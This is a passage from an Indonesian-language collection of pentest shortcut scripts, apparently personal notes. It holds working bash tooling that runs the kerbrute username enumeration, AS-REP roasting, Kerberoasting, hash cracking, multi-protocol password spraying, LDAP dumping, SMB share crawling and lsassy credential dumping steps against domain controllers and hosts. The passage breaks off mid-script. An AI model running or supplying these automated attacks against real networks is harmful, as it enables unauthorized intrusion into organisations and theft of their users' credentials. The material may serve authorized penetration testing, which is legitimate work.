    while IFS= read -r dc_ip; do
        [[ -z "$dc_ip" ]] && continue

        echo -e "\n${CYAN}>>> Checking DC candidate: $dc_ip${NC}"

        discovered_domain=$(get_domain_for_dc "$dc_ip")

        if [[ -z "$discovered_domain" ]]; then
            echo -e "${YELLOW}[!] Could not auto-discover domain for $dc_ip. Skipping kerbrute.${NC}"
            echo "$dc_ip;UNKNOWN" >> "$DC_INFO"
            echo "KERBRUTE_STATUS;$dc_ip;UNKNOWN;SKIPPED_NO_DOMAIN;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi

        echo -e "${GREEN}[+] Domain discovered for $dc_ip: $discovered_domain${NC}"
        echo "$dc_ip;$discovered_domain" >> "$DC_INFO"

        if [[ -z "$RESOLVED_KERBRUTE" ]]; then
            echo -e "${YELLOW}[!] kerbrute not found in PATH/common paths. Skipping userenum.${NC}"
            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_NO_KERBRUTE;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi

        if [[ ! -f "$USERLIST" ]]; then
            echo -e "${YELLOW}[!] Userlist not found: $USERLIST. Skipping kerbrute.${NC}"
            echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;SKIPPED_NO_USERLIST;timeout=${KERBRUTE_TIMEOUT}s;valid_users=0;output=N/A;valid_users_file=N/A" >> "$KERBRUTE_STATUS_FILE"
            continue
        fi

        SAFE_DOMAIN=$(safe_name "$discovered_domain")
        KERB_OUT="$OUTDIR/kerbrute_${dc_ip}_${SAFE_DOMAIN}.txt"
        VALID_USERS_OUT="$OUTDIR/kerbrute_valid_users_${dc_ip}_${SAFE_DOMAIN}.txt"

        echo -e "${YELLOW}[*] Running kerbrute userenum against $dc_ip / $discovered_domain${NC}"
        echo -e "${BLUE}[i] Output: $KERB_OUT${NC}"
        echo -e "${BLUE}[i] Valid users output: $VALID_USERS_OUT${NC}"
        echo -e "${BLUE}[i] Timeout limit: ${KERBRUTE_TIMEOUT}s${NC}"

        : > "$KERB_OUT"
        : > "$VALID_USERS_OUT"

        timeout "${KERBRUTE_TIMEOUT}s" "$RESOLVED_KERBRUTE" userenum \
            -d "$discovered_domain" \
            --dc "$dc_ip" -t 50\
            "$USERLIST" \
            -o "$KERB_OUT" 2>&1 | tee -a "$RAW_OUT"

        KERB_RC=${PIPESTATUS[0]}

        clean_nxc_file "$KERB_OUT"

        grep -a "VALID USERNAME" "$KERB_OUT" 2>/dev/null | \
            awk '{print $NF}' | \
            normalize_user_only_stream | \
            sort -u > "$VALID_USERS_OUT"

        VALID_COUNT=$(wc -l < "$VALID_USERS_OUT" 2>/dev/null || echo 0)

        if [[ "$KERB_RC" -eq 0 ]]; then
            KERB_STATUS="COMPLETED"
            echo -e "${GREEN}[+] Kerbrute completed for $dc_ip / $discovered_domain. Valid users: $VALID_COUNT${NC}"
        elif [[ "$KERB_RC" -eq 124 ]]; then
            KERB_STATUS="TIMEOUT_PARTIAL"
            echo -e "${YELLOW}[!] Kerbrute timeout after ${KERBRUTE_TIMEOUT}s for $dc_ip / $discovered_domain. Partial valid users: $VALID_COUNT${NC}"
        else
            KERB_STATUS="ERROR_RC_${KERB_RC}"
            echo -e "${RED}[!] Kerbrute ended with RC=$KERB_RC for $dc_ip / $discovered_domain. Valid users parsed: $VALID_COUNT${NC}"
        fi

        echo "KERBRUTE_STATUS;$dc_ip;$discovered_domain;$KERB_STATUS;timeout=${KERBRUTE_TIMEOUT}s;valid_users=$VALID_COUNT;output=$KERB_OUT;valid_users_file=$VALID_USERS_OUT" >> "$KERBRUTE_STATUS_FILE"

        if [[ -s "$VALID_USERS_OUT" ]]; then
            echo -e "${GREEN}[+] Kerbrute valid users saved to: $VALID_USERS_OUT${NC}"
            cat "$VALID_USERS_OUT"
        else
            echo -e "${YELLOW}[!] No valid users parsed from kerbrute output for $dc_ip.${NC}"
        fi

    done < "$DC_CANDIDATES"
else
    echo -e "${YELLOW}[!] No DC candidate found from LDAP + Kerberos port mapping.${NC}"
fi

# ====================================================
# PHASE 2.6: MERGE LDAP USERS + KERBRUTE USERS
# ====================================================

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2.6: MERGE LDAP USERS + KERBRUTE USERS${NC}"
echo -e "${PURPLE}====================================================${NC}"

if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip domain; do
        [[ -z "$dc_ip" || -z "$domain" || "$domain" == "UNKNOWN" ]] && continue

        SAFE_DOMAIN=$(safe_name "$domain")
        MERGED_USERS="$OUTDIR/final_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
        TMP_MERGE="$OUTDIR/.tmp_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"

        : > "$TMP_MERGE"
        : > "$MERGED_USERS"

        LDAP_USERS_FILE="$OUTDIR/ldap_nxc_${dc_ip}/users_only_${dc_ip}.txt"
        KERB_USERS_FILE="$OUTDIR/kerbrute_valid_users_${dc_ip}_${SAFE_DOMAIN}.txt"

        LDAP_COUNT=0
        KERB_COUNT=0

        if [[ -s "$LDAP_USERS_FILE" ]]; then
            cat "$LDAP_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
            LDAP_COUNT=$(wc -l < "$LDAP_USERS_FILE" 2>/dev/null || echo 0)
        fi

        if [[ -s "$KERB_USERS_FILE" ]]; then
            cat "$KERB_USERS_FILE" | normalize_user_only_stream >> "$TMP_MERGE"
            KERB_COUNT=$(wc -l < "$KERB_USERS_FILE" 2>/dev/null || echo 0)
        fi

        sort -u "$TMP_MERGE" > "$MERGED_USERS"
        rm -f "$TMP_MERGE"

        MERGED_COUNT=$(wc -l < "$MERGED_USERS" 2>/dev/null || echo 0)

        if [[ "$MERGED_COUNT" -gt 0 ]]; then
            echo -e "${GREEN}[+] Merged users for $dc_ip / $domain: $MERGED_COUNT${NC}"
            echo -e "${BLUE}[i] LDAP users: $LDAP_COUNT | Kerbrute users: $KERB_COUNT${NC}"
            echo -e "${BLUE}[i] Merged file: $MERGED_USERS${NC}"
            echo "MERGED_USERS;$dc_ip;$domain;ldap_users=$LDAP_COUNT;kerbrute_users=$KERB_COUNT;merged_users=$MERGED_COUNT;file=$MERGED_USERS" >> "$MERGED_USERS_STATUS_FILE"
        else
            echo -e "${YELLOW}[!] No users to merge for $dc_ip / $domain.${NC}"
            echo "MERGED_USERS;$dc_ip;$domain;ldap_users=$LDAP_COUNT;kerbrute_users=$KERB_COUNT;merged_users=0;file=$MERGED_USERS" >> "$MERGED_USERS_STATUS_FILE"
        fi

    done < "$DC_INFO"
else
    echo -e "${YELLOW}[!] No DC/domain mapping found. Merge phase skipped.${NC}"
    echo "MERGED_USERS;GLOBAL;N/A;SKIPPED_NO_DC_INFO;merged_users=0;file=N/A" >> "$MERGED_USERS_STATUS_FILE"
fi

# ====================================================
# PHASE 2.7: ASREP ROASTING (NO LDAP)
# ====================================================

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2.7: ASREP ROASTING (NO LDAP)${NC}"
echo -e "${PURPLE}====================================================${NC}"

if ! command -v impacket-GetNPUsers >/dev/null 2>&1; then
    echo -e "${YELLOW}[!] impacket-GetNPUsers not found. ASREP roasting skipped.${NC}"
    echo "ASREP_ROAST;GLOBAL;N/A;SKIPPED_NO_IMPACKET;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
else
    if [[ -s "$DC_INFO" ]]; then
        while IFS=';' read -r dc_ip domain; do
            [[ -z "$dc_ip" || -z "$domain" || "$domain" == "UNKNOWN" ]] && continue

            SAFE_DOMAIN=$(safe_name "$domain")

            USERS_FILE="$OUTDIR/final_all_users_${dc_ip}_${SAFE_DOMAIN}.txt"
            HASH_FILE="$OUTDIR/asrep_hashes_${dc_ip}_${SAFE_DOMAIN}.txt"
            CRACKED_FILE="$OUTDIR/asrep_cracked_${dc_ip}_${SAFE_DOMAIN}.txt"

            : > "$HASH_FILE"
            : > "$CRACKED_FILE"

            if [[ ! -s "$USERS_FILE" ]]; then
                echo -e "${YELLOW}[!] No user list found for $dc_ip / $domain. Skipping.${NC}"
                echo "ASREP_ROAST;$dc_ip;$domain;SKIPPED_NO_USERS;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
                continue
            fi

            echo -e "${CYAN}>>> ASREP roasting: DC=$dc_ip Domain=$domain${NC}"

            timeout "${LDAP_TIMEOUT}s" impacket-GetNPUsers "$domain/" \
                -dc-ip "$dc_ip" \
                -no-pass \
                -usersfile "$USERS_FILE" \
                -format hashcat \
                -outputfile "$HASH_FILE" >/dev/null 2>&1

            RC=$?

            HASH_COUNT=$(wc -l < "$HASH_FILE" 2>/dev/null || echo 0)

            if [[ "$HASH_COUNT" -gt 0 ]]; then
                echo -e "${RED}[!] Found $HASH_COUNT ASREP hash(es). Cracking...${NC}"

                john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
                     "$HASH_FILE" > /dev/null 2>&1

                john --show --format=krb5asrep "$HASH_FILE" > "$CRACKED_FILE"

                CRACKED_COUNT=$(grep -c ":" "$CRACKED_FILE" 2>/dev/null || echo 0)

                echo -e "${GREEN}[+] Cracked: $CRACKED_COUNT credential(s). File: $CRACKED_FILE${NC}"
                cat "$CRACKED_FILE"
            else
                CRACKED_COUNT=0
                echo -e "${GREEN}[+] No ASREP hashes found for $dc_ip / $domain.${NC}"
            fi

            if [[ "$RC" -eq 0 ]]; then
                STATUS="COMPLETED"
            elif [[ "$RC" -eq 124 ]]; then
                STATUS="TIMEOUT"
            else
                STATUS="ERROR_RC_${RC}"
            fi

            echo "ASREP_ROAST;$dc_ip;$domain;$STATUS;hashes=$HASH_COUNT;cracked=$CRACKED_COUNT;hashfile=$HASH_FILE;crackedfile=$CRACKED_FILE" >> "$ASREP_AUDIT_STATUS_FILE"

        done < "$DC_INFO"
    else
        echo -e "${YELLOW}[!] No DC/domain mapping found. Skipping.${NC}"
        echo "ASREP_ROAST;GLOBAL;N/A;SKIPPED_NO_DC_INFO;hashes=0;cracked=0" >> "$ASREP_AUDIT_STATUS_FILE"
    fi
fi

# ====================================================
# PHASE 3: CLEANING + FINAL REPORT
# ====================================================

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 3: CLEANING & FINAL REPORT${NC}"
echo -e "${PURPLE}====================================================${NC}"

clean_nxc_file "$RAW_OUT"

sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" | \
grep -aE "\[\+\]|READ|WRITE|Export|VALID USERNAME|USER FOUND|Done|userenum|VALID LOGIN|VALID USER" | \
grep -av "STATUS_ACCESS_DENIED" | \
sort -u > "$FINAL_OUT"

if [[ -s "$KERBRUTE_STATUS_FILE" ]]; then
    {
        echo ""
        echo "==== KERBRUTE STATUS ===="
        cat "$KERBRUTE_STATUS_FILE"
    } >> "$FINAL_OUT"
fi

if [[ -s "$MERGED_USERS_STATUS_FILE" ]]; then
    {
        echo ""
        echo "==== MERGED USERS STATUS ===="
        cat "$MERGED_USERS_STATUS_FILE"
    } >> "$FINAL_OUT"
fi

if [[ -s "$ASREP_AUDIT_STATUS_FILE" ]]; then
    {
        echo ""
        echo "==== ASREP ROASTING ===="
        cat "$ASREP_AUDIT_STATUS_FILE"
    } >> "$FINAL_OUT"
fi

if compgen -G "$OUTDIR/final_all_users_*.txt" > /dev/null; then
    {
        echo ""
        echo "==== MERGED USER FILES ===="
        for uf in "$OUTDIR"/final_all_users_*.txt; do
            [[ -f "$uf" ]] || continue
            echo "[FILE] $uf"
            echo "count=$(wc -l < "$uf")"
            echo ""
        done
    } >> "$FINAL_OUT"
fi

if compgen -G "$OUTDIR/asrep_exposed_users_*.txt" > /dev/null; then
    {
        echo ""
        echo "==== ASREP EXPOSED USERS ===="
        for af in "$OUTDIR"/asrep_exposed_users_*.txt; do
            [[ -f "$af" ]] || continue
            echo "[FILE] $af"
            if [[ -s "$af" ]]; then
                cat "$af"
            else
                echo "(empty)"
            fi
            echo ""
        done
    } >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_OUT" ]]; then
    echo -e "${GREEN}[!] TEMUAN / SUMMARY:${NC}"
    cat "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] Tidak ditemukan akses anonymous/guest/nullbind/userenum yang valid.${NC}"
fi

echo -e "\n${BLUE}[i] Log lengkap di: $RAW_OUT${NC}"
echo -e "${BLUE}[i] Ringkasan di: $FINAL_OUT${NC}"
echo -e "${BLUE}[i] DC candidates di: $DC_CANDIDATES${NC}"
echo -e "${BLUE}[i] DC/domain mapping di: $DC_INFO${NC}"
echo -e "${BLUE}[i] Kerbrute status di: $KERBRUTE_STATUS_FILE${NC}"
echo -e "${BLUE}[i] Merged users status di: $MERGED_USERS_STATUS_FILE${NC}"
echo -e "${BLUE}[i] ASREP audit status di: $ASREP_AUDIT_STATUS_FILE${NC}"

if compgen -G "$OUTDIR/kerbrute_valid_users_*.txt" > /dev/null; then
    echo -e "${BLUE}[i] Kerbrute valid users files:${NC}"
    ls -1 "$OUTDIR"/kerbrute_valid_users_*.txt
fi

if compgen -G "$OUTDIR/final_all_users_*.txt" > /dev/null; then
    echo -e "${BLUE}[i] Merged user files:${NC}"
    ls -1 "$OUTDIR"/final_all_users_*.txt
fi

if compgen -G "$OUTDIR/asrep_exposed_users_*.txt" > /dev/null; then
    echo -e "${BLUE}[i] ASREP exposed users files:${NC}"
    ls -1 "$OUTDIR"/asrep_exposed_users_*.txt
fi

echo -e "\n${GREEN}[+] Done.${NC}"
```

### Usage
```bash
spray_noauth (default baca file "target" yang berisi list IP)
spray_noauth target1
```
### Note
wordlist menggunakan kombinasi:  https://github.com/insidetrust/statistically-likely-usernames/tree/31132bd5da19787152a354e6adad18b2c8432e73

```bash
awk '!seen[tolower($0)]++ {print tolower($0)}' john.txt service-accounts.txt johns.txt jsmith.txt > merged.txt
```


## 9. spray_auth

**Deskripsi:** Shortcut cepat untuk spray bruteforce user dan password (coba semua protokol nxc: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs)

### Setup
```bash
sudo nano /usr/local/bin/spray_auth
sudo chmod +x /usr/local/bin/spray_auth
```

### Script
```bash
#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"
BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
: > "$BROKEN_PIPE_LOG"
DC_INFO="$OUTDIR/dc_domain_mapping.txt"
DC_CANDIDATES="$OUTDIR/dc_candidates.txt"
FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
echo "" > "$FINAL_CRACKED"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] SPRAY ENGINE v59 | DEBUG & EXPLICIT MODE${NC}"
echo -e "${PURPLE}====================================================${NC}"

# Validasi File
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' tidak ada!${NC}" && exit 1
done

mapfile -t MAPFILE_U < "$USER_FILE"
mapfile -t MAPFILE_P < "$PASS_FILE"

# =========================
# INIT GLOBAL STATE
# =========================
declare -A DC_MAP
declare -A ASREP_DONE
declare -A KERB_DONE

# =========================
# LOAD DC MAPPING (dc_ip;domain)
# =========================
if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip dc_domain; do
        [[ -z "$dc_ip" || -z "$dc_domain" ]] && continue
        DC_MAP["$dc_domain"]="$dc_ip"
    done < "$DC_INFO"

    echo -e "${GREEN}[+] Loaded DC mapping:${NC}"
    for d in "${!DC_MAP[@]}"; do
        echo -e "    ${CYAN}$d${NC} -> ${YELLOW}${DC_MAP[$d]}${NC}"
    done
else
    echo -e "${YELLOW}[!] No DC mapping file found ($DC_INFO)${NC}"
fi

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

# =========================
# BUILD IP → PROTO MAP
# =========================
declare -A PROTO_MAP

for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue

    while read -r ip; do
        [[ -z "$ip" ]] && continue
        PROTO_MAP["$ip"]+="$proto "
    done < "$FILE_PROTO"
done

# =========================
# DOMAIN CACHE (PER IP)
# =========================
declare -A DOMAIN_CACHE

get_domain() {
    local ip="$1"

    # cache hit
    if [[ -n "${DOMAIN_CACHE[$ip]}" ]]; then
        echo "${DOMAIN_CACHE[$ip]}"
        return
    fi

    local domain=""
    for i in {1..3}; do
        domain=$(nxc smb "$ip" --no-progress 2>/dev/null | \
                 grep -oP '(?<=domain:)[^ )]+' | head -n1)

        [[ -n "$domain" && "$domain" != "WORKGROUP" ]] && break
        sleep 1
    done

    [[ -z "$domain" || "$domain" == "WORKGROUP" ]] && domain="."

    DOMAIN_CACHE[$ip]="$domain"
    echo "$domain"
}

# =========================
# RUN NXC FUNCTION
# =========================
run_nxc() {
    local proto="$1" ip="$2" user="$3" pass="$4" extra="$5" domain_flag="$6"

    local MAX_RETRY=3
    local attempt=1

    while (( attempt <= MAX_RETRY )); do
      echo -e "\n${PURPLE}[EXEC][Attempt $attempt] nxc $proto $ip -u '$user' -p '$pass' $extra $domain_flag${NC}"

      timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" $extra $domain_flag --no-progress > .tmp_res 2>&1
      exit_code=$?

      cat .tmp_res
      cat .tmp_res >> "$RAW_OUT"

      # =========================
      # 1. TIMEOUT / CONNECTION ISSUE
      # =========================
      if [[ $exit_code -eq 124 ]] || grep -qiE "Broken Pipe|NETBIOS connection.*timed out|connection.*timed out" .tmp_res; then
          echo -e "${YELLOW}[!] Timeout/Connection issue (attempt $attempt/$MAX_RETRY)${NC}"

          ((attempt++))
          sleep 2
          continue
      fi

      # =========================
      # 2. SUCCESS
      # =========================
      if grep -qE "\[\+\]|Pwn3d!" .tmp_res; then
          echo -e "${GREEN}[+] Valid credentials found${NC}"
          grep -E "\[\+\]|Pwn3d!" .tmp_res | head -n1 >> "$CLEAN_OUT"
          return 0
      fi

      # =========================
      # 3. HARD FAIL (JANGAN RETRY)
      # =========================
      if grep -q "\[-\]" .tmp_res && ! grep -qiE "timed out|Broken Pipe" .tmp_res; then
          echo -e "${RED}[-] Invalid credentials (no retry)${NC}"
          return 1
      fi

      # =========================
      # 4. OTHER FAILURE → RETRY
      # =========================
      echo -e "${YELLOW}[!] Auth failed / unknown response (attempt $attempt/$MAX_RETRY)${NC}"

      ((attempt++))
      sleep 1
  done


    # =========================
    # AFTER ALL RETRY FAIL
    # =========================
    echo -e "${RED}[!] Persistent Error / Broken Pipe on $ip ($proto) → manual check needed${NC}"
    echo "$ip;$proto;$user" >> "$BROKEN_PIPE_LOG"

    return 1
}

# =========================
# MAIN LOOP (IP FIRST)
# =========================
for ip in "${!PROTO_MAP[@]}"; do
    echo -e "\n${CYAN}>>> Target Host: $ip${NC}"

    # --- DOMAIN DISCOVERY ---
    echo -e "${GRAY}[DEBUG] Discovering domain...${NC}"
    DOMAIN=$(get_domain "$ip")
    echo -e "${GRAY}[DEBUG] Domain: $DOMAIN${NC}"

    for proto in ${PROTO_MAP[$ip]}; do
        echo -e "\n${BLUE}[+] PROTOCOL: ${proto^^}${NC}"

        for user in "${MAPFILE_U[@]}"; do
            USER_COMPLETED=false

            for pass in "${MAPFILE_P[@]}"; do
                # 1. Inisialisasi awal untuk Local Auth
                EXTRA=""
                [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
                DOMAIN_ARG=""

                # =========================
                # 1. LOCAL AUTH
                # =========================
                # (Asumsi: fungsi run_nxc mengisi file .tmp_res)
                if run_nxc "$proto" "$ip" "$user" "$pass" "$EXTRA" ""; then
                    USER_COMPLETED=true
                fi

                # =========================
                # 2. DOMAIN AUTH (skip kalau domain ".")
                # =========================
                if [[ "$USER_COMPLETED" == "false" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
                    if run_nxc "$proto" "$ip" "$user" "$pass" "" "-d $DOMAIN"; then
                        USER_COMPLETED=true
                        # PERBAIKAN: Jika sukses di Domain Auth, EXTRA harus kosong
                        # dan kita butuh flag domain untuk langkah selanjutnya
                        EXTRA=""
                        DOMAIN_ARG="-d $DOMAIN"
                    fi
                fi

                # =========================
                # SUCCESS HANDLING
                # =========================
                if [[ "$USER_COMPLETED" == "true" ]]; then
                    AUTH_RESULT=$(cat .tmp_res)
                    echo -e "${GREEN}[!] Success: $user@$ip${NC}"

                    dc_ip="${DC_MAP[$DOMAIN]}"

                    # =========================
                    # LDAP DUMP
                    # =========================
                    if [[ "$proto" == "ldap" ]]; then
                        DUMP_PATH="$OUTDIR/ldap_$ip"
                        mkdir -p "$DUMP_PATH"

                        echo -e "${YELLOW}[!] Running ldapdomaindump...${NC}"

                        if [[ "$DOMAIN" == "." ]]; then
                            LDAP_USER="$user"
                        else
                            LDAP_USER="${DOMAIN}\\$user"
                        fi

                        ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" >/dev/null 2>&1
                    fi


                    # =========================
                    # ASREP ROAST (ONCE PER DOMAIN)
                    # =========================
                    echo -e "${GRAY}[DEBUG] DOMAIN=$DOMAIN | DC=${DC_MAP[$DOMAIN]}${NC}"
                    if [[ -n "$dc_ip" && "$DOMAIN" != "." && -z "${ASREP_DONE[$DOMAIN]}" ]]; then
                        ASREP_DONE[$DOMAIN]=1

                        echo -e "${PURPLE}[EXEC] ASREP roasting → $DOMAIN ($dc_ip)${NC}"

                        ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                        USERS_FILE="$OUTDIR/users_${DOMAIN}.txt"

                        # Ambil user dari LDAP dump kalau ada
                        if [[ -s "$OUTDIR/ldap_$ip/domain_users.grep" ]]; then
                            awk '{print $1}' "$OUTDIR/ldap_$ip/domain_users.grep" | sort -u > "$USERS_FILE"
                        else
                            printf "%s\n" "${MAPFILE_U[@]}" > "$USERS_FILE"
                        fi

                        timeout 30s impacket-GetNPUsers "$DOMAIN/$user:$pass" \
                            -dc-ip "$dc_ip" \
                            -request \
                            -format hashcat \
                            -outputfile "$ASREP_HASH_FILE" >/dev/null 2>&1


                        if [[ -s "$ASREP_HASH_FILE" ]]; then
                            echo -e "${RED}[!] ASREP hash found:${NC}"
                            cat "$ASREP_HASH_FILE"

                            echo -e "${YELLOW}[*] Cracking ASREP hashes...${NC}"
                            john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
                                 "$ASREP_HASH_FILE"

                            echo -e "${GREEN}[+] Cracked ASREP results:${NC}"
                            ASREP_RESULT=$(john --show "$ASREP_HASH_FILE")

                            echo "$ASREP_RESULT"

                            # append ke file final
                            if [[ -n "$ASREP_RESULT" ]]; then
                                echo -e "\n[ASREP]" >> "$FINAL_CRACKED"
                                echo "$ASREP_RESULT" | grep ":" >> "$FINAL_CRACKED"
                            fi

                        else
                            echo -e "${GREEN}[+] No ASREP roastable users${NC}"
                        fi

                    fi

                    # =========================
                    # KERBEROAST (ONCE PER DOMAIN)
                    # =========================
                    if [[ -n "$dc_ip" && "$DOMAIN" != "." && -z "${KERB_DONE[$DOMAIN]}" ]]; then
                        KERB_DONE[$DOMAIN]=1

                        echo -e "${PURPLE}[EXEC] Kerberoasting → $DOMAIN ($dc_ip)${NC}"

                        KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"

                        timeout 30s impacket-GetUserSPNs "$DOMAIN/$user:$pass" \
                            -dc-ip "$dc_ip" \
                            -request \
                            -outputfile "$KERB_HASH_FILE" >/dev/null 2>&1


                        if [[ -s "$KERB_HASH_FILE" ]]; then
                            echo -e "${RED}[!] Kerberoast hash found:${NC}"
                            cat "$KERB_HASH_FILE"

                            john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \
                                 "$KERB_HASH_FILE" >/dev/null 2>&1

                            KERB_RESULT=$(john --show "$KERB_HASH_FILE")

                            echo -e "${GREEN}[+] Cracked Kerberoast results:${NC}"
                            echo "$KERB_RESULT"

                            # append ke file final
                            if [[ -n "$KERB_RESULT" ]]; then
                                echo -e "\n[KERBEROAST]" >> "$FINAL_CRACKED"
                                echo "$KERB_RESULT" | grep ":" >> "$FINAL_CRACKED"
                            fi

                        else
                            echo -e "${GREEN}[+] No Kerberoastable accounts${NC}"
                        fi
                    fi

                    # =========================
                    # SMB POST EXPLOIT
                    # =========================

                    if [[ "$proto" == "smb" ]]; then
                        # Cek apakah akses SMB valid (+)
                        if echo "$AUTH_RESULT" | grep -q "\[+\]"; then
                            echo -e "${YELLOW}[DEBUG] SMB access confirmed${NC}"

                            # -------------------------------------------------------
                            # 1. SPIDER_PLUS
                            # -------------------------------------------------------
                            attempt_sp=1
                            while [ $attempt_sp -le 3 ]; do
                                # Susun command ke dalam variabel biar gampang di-echo
                                SP_CMD="nxc smb $ip -u '$user' -p '$pass' $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=$(readlink -f "$SPIDER_DIR")"

                                echo -e "${PURPLE}[EXEC][Attempt $attempt_sp] $SP_CMD${NC}"
                                
                                # Eksekusi command dari variabel
                                timeout 40s bash -c "$SP_CMD" | tee .tmp_sp

                                # Jika SUKSES (Ada list share)
                                if grep -qE "Enumerated shares|SMB Shares:" .tmp_sp; then
                                    echo -e "${GREEN}[+] spider_plus success!${NC}"
                                    break
                                
                                # Jika GAGAL (Koneksi, Timeout, Broken Pipe, atau No Shares)
                                else
                                    if [ $attempt_sp -eq 3 ]; then
                                        echo -e "${RED}[!] Final Attempt Fail on $ip (spider_plus) → Logged${NC}"
                                        echo "$ip;smb_spider;$user" >> "$BROKEN_PIPE_LOG"
                                        break
                                    fi
                                    
                                    echo -e "${YELLOW}[!] Issue detected, retrying ($attempt_sp/3)...${NC}"
                                    rm -f "$ABS_OUT/${ip}.json" 2>/dev/null
                                    ((attempt_sp++))
                                    sleep 3
                                fi

                            done

                            # -------------------------------------------------------
                            # 2. LSASSY (With Retry Logic - Only if Pwn3d!)
                            # -------------------------------------------------------
                            if echo "$AUTH_RESULT" | grep -qE "Pwn3d!|\[+\]"; then
                              attempt_ls=1
                              while [ $attempt_ls -le 3 ]; do
                                  LS_CMD="nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy"
                                  
                                  echo -e "${RED}[EXEC][Attempt $attempt_ls] $LS_CMD${NC}"
                                  
                                  # Eksekusi dengan timeout agar tidak hang
                                  timeout 40s bash -c "$LS_CMD" | tee .tmp_ls

                                  # Jika SUKSES
                                  if grep -qiE "dumped|success" .tmp_ls; then
                                      echo -e "${GREEN}[+] lsassy success!${NC}"
                                      cat .tmp_ls >> "$RAW_OUT"
                                      break
                                      
                                  # Jika GAGAL (Apapun alasannya: Timeout, No Admin, AV Block)
                                  else
                                      if [ $attempt_ls -eq 3 ]; then
                                          echo -e "${RED}[!] Final Attempt Fail on $ip (lsassy) → Logged${NC}"
                                          echo "$ip;smb_lsassy;$user" >> "$BROKEN_PIPE_LOG"
                                          break
                                      fi
                                      
                                      echo -e "${YELLOW}[!] lsassy failed/issue, retrying ($attempt_ls/3)...${NC}"
                                      ((attempt_ls++))
                                      sleep 3
                                  fi
                              done
                          fi
                        fi
                    fi

                    echo -e "${CYAN}[i] Skipping remaining passwords for $user${NC}"
                    break
                fi
            done
        done
    done
done

rm -f .tmp_res

# --- MULAI PROSES PEMBERSIHAN (DI LUAR LOOP) ---
FINAL_OUT="$OUTDIR/final_summary.txt"

if [[ -f "$RAW_OUT" ]]; then

    # 1. Bersihkan ANSI color (lebih universal)
    sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$RAW_OUT" > "$OUTDIR/temp_clean.log"

    # 2. Ambil baris penting & dedup tanpa ubah urutan
    grep -aE "\[\*\]|\[\+\]|LSASSY" "$OUTDIR/temp_clean.log" | \
        awk '!seen[$0]++' > "$FINAL_OUT"

    echo -e "\n${PURPLE}====================================================${NC}"
    echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
    echo -e "${PURPLE}====================================================${NC}"

    if [[ -s "$FINAL_OUT" ]]; then
        while IFS= read -r line; do
            case "$line" in
                *LSASSY*)
                    echo -e "${PURPLE}${line}${NC}"
                    ;;
                *"[+]"*)
                    echo -e "${GREEN}${line}${NC}"
                    ;;
                *"[*]"*)
                    echo -e "${BLUE}${line}${NC}"
                    ;;
                *)
                    echo -e "${line}"
                    ;;
            esac
        done < "$FINAL_OUT"
    else
        echo -e "${YELLOW}[!] Tidak ada data ditemukan.${NC}"
    fi
    if [[ -s "$BROKEN_PIPE_LOG" ]]; then
      echo -e "\n${RED}[!] BROKEN PIPE HOSTS (MANUAL CHECK REQUIRED)${NC}"
      cat "$BROKEN_PIPE_LOG"
    fi

    # Cleanup aman
